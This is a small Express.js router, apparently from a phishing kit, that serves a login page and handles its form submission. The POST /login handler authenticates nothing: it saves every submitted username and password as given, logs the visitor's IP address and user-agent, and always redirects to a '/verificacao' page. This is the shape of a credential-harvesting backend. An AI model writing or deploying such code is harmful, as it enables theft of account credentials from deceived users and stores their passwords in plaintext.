const express = require('express');
const path = require('node:path');
const db = require('../db');

const router = express.Router();

router.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'views', 'login.html'));
});

router.post('/login', (req, res) => {
  const { usuario, senha } = req.body || {};

  if (!usuario || !senha) {
    return res.status(400).json({ ok: false, erro: 'Usuario e senha sao obrigatorios.' });
  }

  db.salvarDispositivo(req.sessionId, req.ip, req.headers['user-agent'] || '');
  db.salvarLogin(req.sessionId, String(usuario), String(senha));

  return res.json({ ok: true, redirect: '/verificacao' });
});

module.exports = router;
